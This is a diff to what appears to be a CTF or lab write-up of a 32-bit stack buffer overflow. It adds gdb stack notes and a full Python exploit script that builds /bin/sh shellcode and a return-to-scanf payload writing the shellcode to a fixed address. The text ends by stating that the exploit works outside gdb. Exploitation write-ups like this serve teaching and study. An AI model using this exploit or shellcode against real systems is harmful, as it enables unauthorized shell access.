@@ -951,8 +951,12 @@ Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
 ```
 
 Examine the first three values of the stack:
-```
+```     
+            %s
+            v
 0x08049221	0x0804a0f7	0xffffd974
+^                       ^
+return address          address to write to
 ```
 
 `0x08049221` is the return address:
@@ -969,6 +973,9 @@ this is the return address after the scanf call completes
 0x804a0f7:	"%s"
 ```
 
+Check if %s is always at address: 0x804a0f7
+Yes it is.
+
 `0xffffd974` is the location that scanf will write to. To confirm this, continue the program and check this memory location:
 ```
 (gdb) x/s 0xffffd974
@@ -984,12 +991,26 @@ First get the address of scanf, which we already have a breakpoint for:
 0x08049080  __isoc99_scanf@plt
 ```
 
-```
+[script](exploit3.py)
+```python
+#!/usr/bin/python3
+import struct
+
+# mov al,0xff     0xb0 0xff
+# sub al,0xf4     0x2c 0xf4
+mov = b'\xb0\xff'
+sub = b'\x2c\xf4'
+shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2'
+shellcode += mov + sub + b'\xcd\x80\x31\xc0\x40\xcd\x80'
+
 scanf = struct.pack("I", 0x08049080)
 percentS = struct.pack("I", 0x0804a0f7)
 payloadAddress = struct.pack("I", 0x0804c000)
-payload = b'1 ' + b'A' * 1012 + b'BBBB' + scanf + payloadAddress + percentS + payloadAddress
-payload += b' ' + shellcode
+
+payload = b'1 ' + b'A' * 1012 + b'BBBB' + scanf + payloadAddress + percentS + payloadAddress + b' ' + shellcode
+
+with open("payload", "wb") as handle:
+    handle.write(payload)
 ```
 
 This is it. Run the payload in gdb. It works. Run it without gdb; don't forget to chain cat so that u can control the shell:
